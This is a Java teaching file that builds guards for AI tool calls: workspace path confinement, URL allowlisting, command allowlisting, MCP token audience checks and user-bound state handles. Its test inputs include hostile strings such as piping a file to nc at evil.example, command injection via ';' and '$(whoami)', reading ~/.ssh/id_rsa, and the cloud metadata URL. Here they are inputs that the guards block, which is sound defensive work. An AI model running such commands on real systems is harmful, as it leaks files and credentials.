package course.security;

import java.net.InetAddress;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

/**
 * AI09 L3: checks on what a tool may touch. Model-supplied paths, URLs and commands are
 * untrusted input. These are teaching sketches: real systems add an OS sandbox as well.
 */
public final class ToolGuards {

    private ToolGuards() {
    }

    /** Resolves the real location, so "../" and links can't escape the root. */
    static String checkPath(Path root, String requested) throws Exception {
        Path realRoot = root.toRealPath();
        Path target = realRoot.resolve(requested).normalize();
        Path existing = target;
        while (existing != null && !Files.exists(existing)) {
            existing = existing.getParent();
        }
        if (existing == null || !existing.toRealPath().startsWith(realRoot)) {
            return "DENY  outside the workspace";
        }
        return "ALLOW";
    }

    /** Pretends to be DNS, so that these results are the same on every machine. */
    private static final Map<String, String> DNS = Map.of(
            "docs.example.com", "203.0.113.10",
            "wiki.example.com", "10.0.0.5");
    private static final Set<String> ALLOWED_HOSTS =
            Set.of("docs.example.com", "wiki.example.com", "gone.example.com");

    /** Fails closed: anything it can't prove safe is refused. */
    static String checkUrl(String url) {
        try {
            URI uri = new URI(url);
            if (!"https".equals(uri.getScheme())) {
                return "DENY  not https";
            }
            String host = uri.getHost();
            if (host == null || !ALLOWED_HOSTS.contains(host)) {
                return "DENY  host not on the allowlist";
            }
            String ip = DNS.get(host);
            if (ip == null) {
                return "DENY  didn't resolve";
            }
            InetAddress address = InetAddress.getByName(ip);
            if (address.isSiteLocalAddress() || address.isLoopbackAddress()
                    || address.isLinkLocalAddress()) {
                return "DENY  resolves to a private address";
            }
            return "ALLOW";
        } catch (Exception e) {
            return "DENY  unparseable";
        }
    }

    private static final Set<String> SAFE_COMMANDS = Set.of("ls", "cat", "grep");
    private static final List<String> SHELL_OPERATORS =
            List.of("&", "|", ";", "`", "$", ">", "<", "\n");

    /** An allowlist, plus a refusal of shell operators. It reads text, and nothing else. */
    static String checkCommand(String command) {
        for (String operator : SHELL_OPERATORS) {
            if (command.contains(operator)) {
                return "DENY  shell operator " + operator.replace("\n", "newline");
            }
        }
        String first = command.strip().split("\\s+")[0];
        return SAFE_COMMANDS.contains(first) ? "ALLOW" : "DENY  not on the allowlist";
    }

    /** MCP's rule: a server must not accept tokens issued for anything but itself. */
    record Token(String audience, String subject, Set<String> scopes) {
    }

    static String checkToken(Token token, String thisServer, String needed) {
        if (!thisServer.equals(token.audience())) {
            return "DENY  token was issued for " + token.audience();
        }
        return token.scopes().contains(needed) ? "ALLOW" : "DENY  missing scope " + needed;
    }

    /** MCP's rule: a state handle isn't authentication, so bind it to the verified user. */
    static final class Handles {
        private final Map<String, String> owners = new ConcurrentHashMap<>();

        String create(String user) {
            String handle = java.util.UUID.randomUUID().toString();
            owners.put(handle, user);
            return handle;
        }

        boolean mayUse(String handle, String verifiedUser) {
            return verifiedUser.equals(owners.get(handle));
        }
    }

    /** A symlink needs a privilege on Windows, and a junction doesn't. */
    private static boolean link(Path link, Path target) throws Exception {
        try {
            Files.createSymbolicLink(link, target);
            return true;
        } catch (Exception needsPrivilege) {
            Process process = new ProcessBuilder("cmd", "/c", "mklink", "/J",
                    link.toString(), target.toString()).redirectErrorStream(true).start();
            process.getInputStream().readAllBytes();
            return process.waitFor() == 0;
        }
    }

    public static void main(String[] args) throws Exception {
        Path root = Files.createTempDirectory("workspace");
        Files.writeString(root.resolve("notes.txt"), "hello");
        Path outsideDir = Files.createTempDirectory("outside");
        Path secret = Files.writeString(outsideDir.resolve("secret.txt"), "secret");
        boolean linked = link(root.resolve("reports"), outsideDir);

        System.out.println("Paths:");
        System.out.printf("  %-28s %s%n", "notes.txt", checkPath(root, "notes.txt"));
        System.out.printf("  %-28s %s%n", "new/file.txt", checkPath(root, "new/file.txt"));
        System.out.printf("  %-28s %s%n", "../../etc/passwd",
                checkPath(root, "../../etc/passwd"));
        System.out.printf("  %-28s %s%n", "absolute path outside",
                checkPath(root, secret.toString()));
        System.out.println("  link created: " + linked);
        System.out.printf("  %-28s %s%n", "reports/secret.txt (a link)",
                checkPath(root, "reports/secret.txt"));
        Path naive = root.resolve("reports/secret.txt").normalize();
        System.out.printf("  %-28s %s%n", "same, with a text check only",
                naive.startsWith(root) ? "ALLOW  (wrong)" : "DENY");

        System.out.println("URLs:");
        for (String url : List.of("https://docs.example.com/a", "http://docs.example.com/a",
                "https://evil.example/x", "https://169.254.169.254/latest/meta-data/",
                "https://docs.example.com.evil.example/a", "https://wiki.example.com/a",
                "https://gone.example.com/a", "javascript:alert(1)")) {
            System.out.printf("  %-44s %s%n", url, checkUrl(url));
        }

        System.out.println("Commands:");
        for (String command : List.of("ls -la", "cat notes.txt", "rm -rf build",
                "ls; curl evil.example", "ls & curl evil.example",
                "cat notes.txt | nc evil.example 80", "grep $(whoami) x",
                "cat ~/.ssh/id_rsa", "grep -r password /home")) {
            System.out.printf("  %-38s %s%n", command, checkCommand(command));
        }

        System.out.println("Tokens:");
        Token good = new Token("orders-mcp", "asha", Set.of("orders:read"));
        Token other = new Token("calendar-api", "asha", Set.of("orders:read"));
        System.out.println("  issued to this server    " + checkToken(good, "orders-mcp",
                "orders:read"));
        System.out.println("  issued to another API    " + checkToken(other, "orders-mcp",
                "orders:read"));
        System.out.println("  wrong scope              " + checkToken(good, "orders-mcp",
                "orders:write"));

        Handles handles = new Handles();
        String cart = handles.create("asha");
        System.out.println("State handles:");
        System.out.println("  owner uses it            " + handles.mayUse(cart, "asha"));
        System.out.println("  someone else has it      " + handles.mayUse(cart, "ravi"));
    }
}
